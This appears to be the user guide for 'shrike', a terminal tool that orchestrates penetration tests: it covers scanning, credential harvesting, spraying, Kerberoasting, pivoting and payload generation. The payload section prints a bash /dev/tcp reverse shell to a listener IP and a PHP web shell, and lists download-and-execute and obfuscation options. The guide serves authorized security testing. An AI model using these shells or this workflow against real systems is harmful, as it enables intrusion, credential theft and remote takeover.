# Using shrike

shrike takes you from a list of IPs to a written-up engagement: it ingests scans,
maps the network, suggests the next step, runs the command, captures the output,
harvests any credentials back into its own state, and generates payloads — all from
one terminal interface.

- [Launching](#launching)
- [The interface](#the-interface)
- [Commands](#commands)
- [A full workflow](#a-full-workflow)
- [Payload generation](#payload-generation)
- [The workspace on disk](#the-workspace-on-disk)
- [Tips](#tips)

---

## Launching

```bash
shrike [OPTIONS]
```

| flag | meaning |
|---|---|
| `-n, --name <NAME>` | engagement name (default `engagement`) |
| `-w, --workspace <DIR>` | workspace directory (default `./<name>-shrike`) |
| `-t, --targets <SPEC>` | seed targets — repeatable; an IP, a CIDR, or a hosts file |
| `--import <nmap.xml>` | ingest an existing nmap `-oX` scan at startup — repeatable |
| `-j, --parallel <N>` | max commands to run at once (default 8) |
| `--plan` | print the topology + enumeration plan and exit (no TUI) |

Examples:
```bash
# start fresh against a subnet
shrike --name acme --targets 192.168.50.0/24

# resume yesterday's engagement (same workspace = same state)
shrike --name acme --workspace acme-shrike

# ingest a scan you already ran, then work interactively
shrike --name acme --import services.xml --targets hosts.txt

# just print the plan, no UI
shrike --targets hosts.txt --import services.xml --plan
```

Re-launching with the same workspace **resumes** everything — hosts, credentials,
command history, notes.

---

## The interface

A minimalist terminal UI:

```
  shrike  ·  4 hosts · 21 open ports · 2 creds · 6 cmds        ● 1 running
  ✳ shrike — recon-to-exploitation orchestrator
  … transcript of commands and their output scrolls here …
  Tab ⇥ run "nmap all 65535 ports" · / for menu · /suggest · /help
╭ 192.168.133.206 ─────────────────────────────────────────────╮
│❯ /                                                            │
╰──────────────────────────────────────────────────────────────╯
```

- **Type `/`** → a command menu pops up above the input. Arrow keys select, `Tab`
  completes.
- **`Tab` with no menu** → runs the highlighted suggestion.
- **`Ctrl-G`** (or `/panel`) → toggle the dashboard: next-step suggestions + the
  focused host's ports, OS and domain.
- **`PgUp`/`PgDn`** → scroll the transcript. **`Ctrl-C`** → cancel running jobs (press
  again with none running to quit). **`Ctrl-U`** → clear the input.

Everything the operator sees is also written to `notes.md` and the per-command output
files, continuously.

---

## Commands

Type them at the prompt (leading `/`). Most have short aliases.

### Scope & scanning
| command | does |
|---|---|
| `/target <ip\|cidr\|file>` | add targets to scope |
| `/import <nmap.xml>` | ingest an nmap `-oX` scan (auto-classifies topology) |
| `/focus <ip>` | set the current host context (suggestions + `{ip}` fill from it) |
| `/run <tool-id>` | run a specific catalog tool (e.g. `/run nmap-full`) |
| `/raw <command>` | run any shell command as a tracked job |
| `/suggest` | print phase-ranked next steps for the current context |
| `/phase <name>` | filter suggestions to one phase (e.g. `/phase ad-enum`) |

### Credentials & intel
| command | does |
|---|---|
| `/cred [domain/]user:secret` | add a credential (32-hex ⇒ treated as an NT hash) |
| `/harvest <file\|text>` | scrape creds / hashes / domain facts out of output |
| `/set <key> <value>` | set `proxy`, `iface`, `domain`, `dc`, `lhost`, `lport`, or a wordlist |

### Payloads
| command | does |
|---|---|
| `/payload <id> [lhost] [lport] [+xform]` | generate a shell payload |
| `/payloads [filter]` | list payloads (filter by os/lang/kind/id) |
| `/msf <id> [lhost] [lport]` | build an msfvenom command + matching handler |

### Session
| command | does |
|---|---|
| `/panel` | toggle the dashboard side panel |
| `/cancel [job-id]` | cancel one running job, or all |
| `/export` | write `notes.md` now |
| `/star` | star the last command (highlighted in the report) |
| `/help` | full key + command reference |
| `/quit` | save and exit |

---

## A full workflow

This mirrors a real internal/AD engagement.

**1 — Scope and scan.**
```
/target 192.168.50.0/24
/run nmap-full            # full-port sweep on the focused host (or /raw your own nmap -oX)
```
When any `nmap … -oX` job finishes, shrike ingests the XML automatically: hosts,
services, OS, and the network topology (which segments are directly routable vs.
**pivot-required**).

**2 — Enumerate a host.** Focus it and let shrike suggest:
```
/focus 192.168.50.20
/suggest                 # e.g. whatweb, feroxbuster, nxc-smb-null, …
Tab                      # run the top suggestion
```
Only tools that apply to that host's open ports/services are offered.

**3 — Grab a foothold's loot.** Every command's output is auto-harvested. If a scan or
an FTP mirror reveals `Username: r.andrews / Password: …`, shrike extracts it and says
so. You can also feed it a file:
```
/harvest loot/192.168.50.20-ftp/notes.txt
/cred oscp.exam/r.andrews:BusyOfficeWorker890
```
Base64 secrets are decoded automatically; a 32-hex secret is stored as an NT hash.

**4 — Spray and move.** With a credential known, new tools unlock:
```
/run nxc-spray           # spray the cred across the subnet
/run bloodhound-py       # collect the AD graph (needs a DC + a cred)
/focus 192.168.50.20
/run evil-winrm          # prints the exact command (interactive — see note below)
```
When netexec reports `(Pwn3d!)`, shrike marks that host **OWNED**.

**5 — Kerberos.** If a DC was found:
```
/run ntpdate            # sync clock first — Kerberos rejects skew > 5 min
/run asreproast         # no creds needed, just a userlist
/run kerberoast         # any valid domain user
/run hashcat-tgs        # crack the TGS-REP output
```

**6 — Pivot into an unreachable segment.** shrike already flagged `172.16.x.0/24` as
pivot-required. Set the tunnel and it prefixes network tools with proxychains:
```
/set proxy 127.0.0.1:1080
/run ligolo-proxy       # or chisel-server — prints the setup sequence
```

**7 — Write-up.** It's already written — `notes.md` in the workspace is regenerated
after every command, grouped by phase, with the topology map and credential table.
`/export` forces a refresh; `/star` marks the commands that mattered.

> **Interactive tools** (evil-winrm, ftp, mssqlclient, psexec, wmiexec) need a real
> TTY. shrike detects these and *prints the exact command* for you to paste into a
> separate terminal, rather than capturing them as a batch job.

---

## Payload generation

Set your listener once, then generate in any language and encoding.

```
/set lhost 10.10.14.7
/set lport 443

/payload bash-devtcp                       # bash -i >& /dev/tcp/10.10.14.7/443 0>&1
/payload ps-tcpclient +ps-encodedcommand   # UTF-16LE+base64 -> powershell -enc <blob>
/payload php-webshell                       # <?php system($_REQUEST['cmd']) ?>
/msf win-meterpreter-tcp                    # full msfvenom line + multi/handler
```

Each generated payload is echoed with its **matching listener**, saved to `loot/`,
and — where relevant — a list of transforms you can append with `+`.

- **Reverse shells:** `bash-devtcp` `sh-mkfifo` `nc-e` `ncat-e` `socat-tty`
  `python-pty` `php-fsockopen` `perl` `ruby` `awk` `lua` `golang` `telnet` `openssl`
  `ps-tcpclient` `ps-download-iex` `powercat` …
- **Bind shells:** `nc-bind` `socat-bind` `ps-bind`
- **Web shells:** `php-webshell` `php-oneliner` `jsp-webshell` `aspx-webshell`
- **TTY upgrade:** `tty-python` `tty-script`
- **File transfer:** `dl-certutil` `dl-ps-iwr` `dl-wget` `xfer-smbserver`
- **Transforms (`+name`):** `base64` `ps-encodedcommand` `hex` `url-encode`
  `double-url-encode` `xor-ps-stub` `ps-char-array` `bash-b64-exec` `py-b64-exec`
  `php-b64-eval`
- **msfvenom specs:** `win-meterpreter-tcp` `win-meterpreter-https` `win-shell-tcp`
  `linux-shell-tcp` `php-meterpreter` `jsp-shell` `war-shell` `aspx-shell` `psh-cmd`
  `msi`

`/payloads` lists everything; `/payloads windows` or `/payloads php` filters.

---

## The workspace on disk

```
<name>-shrike/
  engagement.json     full state, rewritten atomically after every command (resumable)
  notes.md            phase-grouped report: topology, creds, every command + output ref
  targets/<ip>/<phase>/<id>-<tool>.txt    full captured output of each command
  loot/               generated payloads and files pulled off targets
```

Delete the directory to start over; keep it to resume. `notes.md` and
`engagement.json` are safe to read while shrike is running.

---

## Tips

- **`--plan` is great for triage** — pipe a big scan in and read the topology + ranked
  vectors without entering the UI.
- **`-j` controls parallelism.** Bump it (`-j 20`) for wide subnet sweeps; lower it on
  fragile networks.
- **`/phase` narrows the noise.** During AD work, `/phase ad-attack` shows only the
  relevant tools.
- **Star as you go.** `/star` after a command that produced something keeps the final
  report focused.
- **It's an orchestrator, not an autopilot.** Every command is operator-initiated; shrike
  suggests and records, you decide. Only use it against systems you're authorized to test.
